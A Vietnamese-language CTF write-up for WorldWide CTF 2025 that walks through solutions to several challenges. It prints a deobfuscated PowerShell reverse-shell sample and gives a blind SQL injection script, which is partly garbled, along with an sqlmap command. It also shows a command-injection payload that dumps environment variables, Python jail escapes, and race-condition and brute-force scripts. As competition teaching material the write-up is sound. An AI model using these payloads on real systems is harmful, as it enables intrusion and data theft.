---
title: "[Write-up] WorldWide CTF 2025"
published: 2025-07-29
tags: [CTF, WWF]
category: Write-up
description: Thật vui khi ghi được điểm trong cuộc thii
draft: false
image: /assets/data/wwf-banner.png
---

# Beginner

## Nishang
>Analyze the provided network capture to uncover what was downloaded to the victim’s machine.

Chúng ta được cung cấp 1 file ```.pcap``` theo dõi luồng ta thấy có 1 file ```udujreghjs.ps1``` được tải xuống, , vì vậy hãy xuất gói này. ```udujreghjs.ps1``` chứa một chuỗi base64

Giãi mã base64 và bỏ hết các byte null ta được

```
((("{47}{90}{16}{94}{30}{84}{52}{111}{58}{56}{33}{106}{101}{23}{11}{73}{92}{14}{86}{49}{115}{113}{80}{70}{22}{98}{40}{10}{6}{67}{5}{69}{25}{44}{71}{45}{61}{57}{97}{99}{104}{110}{117}{109}{105}{91}{53}{51}{34}{100}{26}{21}{13}{116}{39}{24}{103}{78}{37}{72}{2}{7}{85}{8}{82}{55}{68}{75}{89}{12}{64}{43}{4}{3}{35}{77}{38}{32}{63}{93}{28}{17}{96}{79}{66}{36}{29}{87}{107}{108}{83}{48}{54}{1}{0}{112}{9}{102}{15}{31}{18}{81}{50}{88}{20}{76}{59}{65}{74}{60}{62}{41}{46}{114}{95}{27}{19}{42}"-f'.','t','n',')','ing ','};while((n','4','z0sendback ',' (i',']::ASCII)','L6','0n}1','2>&1 L6','ding',' nz0clie','etBytes(nz0sendb',' = Ne','endback',');n','lose(','rite','ASCIIEnco','= 0.','1','es,','0i = nz0str','.','nt.C','s','pwd)','Object System.','ack2','b','m3_','peName System.Tex',';nz0','(',')','nd','GetString(nz0byt','5','lush()',')
',' Out-Str','eam.Read','nz0b','};nz0','nz','yte = ','.GetStream();[byt','0s','y','So','ect -T','([tex',' nz','wwf{s0','z0b','ts.TCPClient(19R','byte,0','ength);nz0str','ytes, 0, n','eam.F','ac','4',',nz0sendbyte.','S 19R + ','%{0','0d','z','tes ','(',';','9R,9001);n','L','a','(nz0send','se','0i',' 19RP','nz0by','z','ex','9R;nz0sendb','Net.','=','nt','.Path ','tream.W','ta ','0client','bj','z0stream =','k2  = nz0','w-','ie',' +','y','.6553','tes.Length)) -ne 0){;nz0','t','l_0bfusc47','.G','0, nz','dat','O','p0w3r5h3l','+ 19R','> 1','New-','a = ','cke','encoding','[]]','cl','e',').','('))-rePLace  'L64',[ChaR]124-CrepLaCe([ChaR]49+[ChaR]57+[ChaR]82),[ChaR]39 -CrepLaCe  'nz0',[ChaR]36)|& ((gv '*mdR*').nAmE[3,11,2]-jOiN'')
```

Nó đã bị làm rối, về cơ bản chỉ là mảng, viết 1 mã python để giải 

```python
indexes = [47, 90, 16, 94, 30, 84, 52, 111, 58, 56, 33, 106, 101, 23, 11, 73, 92, 14, 86, 49, 115, 113, 80, 70, 22, 98, 40, 10, 6, 67, 5, 69, 25, 44, 71, 45, 61, 57, 97, 99, 104, 110, 117, 109, 105, 91, 53, 51, 34, 100, 26, 21, 13, 116, 39, 24, 103, 78, 37, 72, 2, 7, 85, 8, 82, 55, 68, 75, 89, 12, 64, 43, 4, 3, 35, 77, 38, 32, 63, 93, 28, 17, 96, 79, 66, 36, 29, 87, 107, 108, 83, 48, 54, 1, 0, 112, 9, 102, 15, 31, 18, 81, 50, 88, 20, 76, 59, 65, 74, 60, 62, 41, 46, 114, 95, 27, 19, 42]

codes = ['.','t','n',')','ing ','};while((n','4','z0sendback ',' (i',']::ASCII)','L6','0n}1','2>&1 L6','ding',' nz0clie','etBytes(nz0sendb',' = Ne','endback',');n','lose(','rite','ASCIIEnco','= 0.','1','es,','0i = nz0str','.','nt.C','s','pwd)','Object System.','ack2','b','m3_','peName System.Tex',';nz0','(',')','nd','GetString(nz0byt','5','lush()',')',' Out-Str','eam.Read','nz0b','};nz0','nz','yte = ','.GetStream();[byt','0s','y','So','ect -T','([tex',' nz','wwf{s0','z0b','ts.TCPClient(19R','byte,0','ength);nz0str','ytes, 0, n','eam.F','ac','4',',nz0sendbyte.','S 19R + ','%{0','0d','z','tes ','(',';','9R,9001);n','L','a','(nz0send','se','0i',' 19RP','nz0by','z','ex','9R;nz0sendb','Net.','=','nt','.Path ','tream.W','ta ','0client','bj','z0stream =','k2  = nz0','w-','ie',' +','y','.6553','tes.Length)) -ne 0){;nz0','t','l_0bfusc47','.G','0, nz','dat','O','p0w3r5h3l','+ 19R','> 1','New-','a = ','cke','encoding','[]]','cl','e',').','(']

code_str = ''
for i in indexes:
    code_str += codes[i]

code_str = code_str.replace('L64', chr(124))
code_str = code_str.replace(chr(49) + chr(57) + chr(82), chr(39))
code_str = code_str.replace('nz0', chr(36))
print(code_str)
```
## The_Needle
>You are presented with a simple search tool, an interface to a vast and hidden archive of information. Your mission is to find a single, specific secret hidden within. The tool is your only guide, but it is notoriously cryptic. You'll need to use clever queries and careful observation to uncover the prize.

Đọc source code ta thấy trang web này đã dính lỗ hổng SQLi, cụ thể là ``` blind SQL injection``` ở tham số ```id```, Cách đơn giản nhất ta có thể sử dụng công cụ ```SQLmap``` hoặc viết một mã python đơn giản

```
sqlmap -u "https://the-needle.chall.wwctf.com/index.php?id=1" --batch --dump
```
```python
#!/usr/bin/env python3 
import requests 

base_url = "https://the-needle.chall.wwctf.com/?id=" 

for i in  range ( 1 , 50 ): 
    sql = "' or (select length(information) from info) = %d -- -" % i 
    url = base_url + sql 
    r = requests.get(url) if "Yes, We found it !!" in r.text:
         print ( "[+] Cờ có %d ký tự" % i) 
        flaglen = i break 
flag = '' for j in range ( 1 , flaglen + 1 ):
     for x in range ( 32 , 127 ): 
        sql = "' or substr((select information from info), %d, 1) = '%s' -- -" % (j, chr (x)) 
        url = base_url + sql 
        r = requests.get(url) if "Yes, We found it !!" trong r.text: 
            flag += chr (x)
             print ( "[+] flag is:" , flag)
             break print ( "[*] flag is:" , flag)
```


## Based_64
>My friend gynvael told me that base64 has some interesting properties...

Về cơ bản, trông giống như một ký tự đơn được mã hóa base64 , nhưng có một chút khác biệt. Theo nguyên tắc của base64 , đối với ký tự thứ hai của mã hóa base64 của một ký tự đơn, bốn bit cuối cùng của bảng base64 phải bằng 0. Tuy nhiên, điều này không đúng, vì vậy chúng tôi trích xuất phần đó và giải mã thành số nhị phân.

```python
#!/usr/bin/env python3
from string import *

chars = ascii_uppercase + ascii_lowercase + digits + '+/'

with open('based64.txt', 'r') as f:
    lines = f.read().splitlines()

bin_flag = ''
for line in lines:
    b0 = chars.index(line[0])
    b1 = chars.index(line[1])
    b = bin(b0)[2:].zfill(6) + bin(b1)[2:].zfill(6)
    bin_flag += b[-4:]

flag = ''
for i in range(0, len(bin_flag), 8):
    flag += chr(int(bin_flag[i:i+8], 2))
print(flag)
```

Có thể dùng kho lưu trữ này https://gist.github.com/dhondta/90a07d9d106775b0cd29bb51ffe15954 cũng rất hữu ích 

## Evil_Snek
>Help!! Evil snek has put me in jail and won't let me execute whatever commands I want :( :( Can you help me break free?

```python
#!/usr/bin/python3

def blacklist(cmd):
    if cmd.isascii() == False:
        return True
    bad_cmds = ['"',
                "'",
                "print",
                "_",
                ".",
                "import",
                "os",
                "lambda", 
                "system",
                "(",
                ")",
                "getattr",
                "setattr",
                "globals",
                "builtins",
                "input",
                "compile",
                "eval",
                "exec",
                "open",
                "read"]
    for i in bad_cmds:
        if i in cmd:
            return True
    return False
while True:
    inp = input("> ")
    if not blacklist(inp):
        try:
            exec(inp)
        except Exception as e:
            print("snek says: Error!")
            exit(0)
    else:
        print("snek says: Blacklisted!")
        exit(0)
```

Trước đây tôi đã gặp 1 thử thách tương tự và bypass nó bằng cách đặt mảng những kí tự bị cấm bằng mảng rỗng, Tuy nhiên thử thách này ```bad_cmds``` có kí tự ```_``` bị cấm nên cách này không có nghĩa 

Giải pháp thay thể là chúng ta đặt ```blacklist=callable``` nó sẽ ghi đè hàm blacklist và trở thành ```callable()``` của Python có thể thực thi tất cả các lệnh tùy ý 

## Galactic_Shuttle
>
Cùng một người dùng cần hai vé, nhưng điều này không thể thực hiện được do hệ thống. Tuy nhiên, có vẻ như ```Race Condition``` là có thể. Một luồng riêng biệt có thể đồng thời lấy được một vé và một cờ.

```python
import requests
import threading

URL = "https://30f98a40a253d4b3d35f1f0f437f222a.chall.wwctf.com"
USER = "minhtuan"

def acquire():
    r = requests.get(f"{URL}/acquire", params={"user": USER})
    print(r.text)

threads = []
for _ in range(20):  # Gửi nhiều để tăng khả năng race condition
    t = threading.Thread(target=acquire)
    t.start()
    threads.append(t)

for t in threads:
    t.join()

# Sau đó kiểm tra flag
r = requests.get(f"{URL}/flag", params={"user": USER})
print("[*] FLAG RESPONSE:", r.text)

```

# Web

## Domain_of_Doom
Chỉ cần truy cập https://eb08eacc5488ed3c9d1557ecf76826bd.chall.wwctf.com/flag .

## Domain_of_Doom_Revenge
>You're querying domains, but some lead to dangerous places<br>
The flag is hidden in an environment variable.

payload

```
google; sh -c env .com
```
Ta sẽ đọc file env  sử dụng ```sh -c``` để thực thi lệnh và bỏ qua .com



# Mics

## bf_jail
>I found this calculator on the roadside, don't know why it's broken

```python
#!/usr/bin/env python3
import sys


def bf(code):
    output = ""
    s = []
    matches = {}
    tape = [0] * 1000000
    for i, j in enumerate(code):
        if j == "[":
            s.append(i)
        if j == "]":
            m = s.pop()
            matches[m] = i
            matches[i] = m
    cp = 0
    p = 0
    while cp < len(code):
        if code[cp] == "+":
            tape[p] = (tape[p] + 1) % 256
        if code[cp] == "-":
            tape[p] = (tape[p] - 1) % 256
        if code[cp] == ",":
            c = sys.stdin.read(1)
            tape[p] = (ord(c) if c else 0) % 256
        if code[cp] == ".":
            output += chr(tape[p])
        if code[cp] == "<":
            p -= 1
        if code[cp] == ">":
            p += 1
        if code[cp] == "[":
            if not tape[p]:
                cp = matches[cp]
        if code[cp] == "]":
            if tape[p]:
                cp = matches[cp]
        cp += 1

    return output


if __name__ == "__main__":
    code = input("> ")
    if len(code) > 200:
        print("200 chars max")
        sys.exit(0)
    if not all(c in set("+-<>[],.") for c in code):
        print("nope")
        exit(0)
    code = bf(code)
    exec(code)
```
Ta có thể thấy code chỉ cho thực thi mã ```brainfuck-language``` và giới hạn độ dài các kí tự là 200

Đơn giản là có thể thể mở một ```input``` mới bằng lệnh ```exec(input())``` sẽ được chạy lệnh tùy ý

https://www.dcode.fr/brainfuck-language

## Vibes

Chúng ta kết nối nc đến server và nhập một lệnh bất kì và server chỉ trả về đúng hoặc không, Vì vậy chúng ta có thể brute force từng kí tự của flag bằng cách sử dụng ```grep```

```python
from pwn import *

context.log_level = 'error'
HOST = 'chal.wwctf.com'
PORT = 6001

charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_'

def check_guess(guess):
    try:
        io = remote(HOST, PORT)
        io.recvuntil(b'> ')
        io.sendline(f'grep ^{guess} *')
        res = io.recvuntil(b'> ', drop=True).decode(errors='ignore')
        io.close()
        return 'Good Vibes' in res
    except:
        return False

flag = 'wwf{'

while not flag.endswith('}'):
    for c in charset:
        guess = flag + c
        print(f'Trying: {guess}')
        if check_guess(guess):
            flag += c
            print(f'[+] Found so far: {flag}')
            break
    else:
        print('[-] No match found for next char, stopping.')
        break

print(f'[🎉] Final Flag: {flag}')
```

# Forensics

## Silver Moon
>Rumors whisper of a shadow moving beneath the Silver Moon.<br>
Investigate the strange occurrences and reveal the demon’s hidden technique before it’s too late<br>
WARNING: Do not run the malware file on your PC.<br>
https://powershell.wwctf.com/<br> 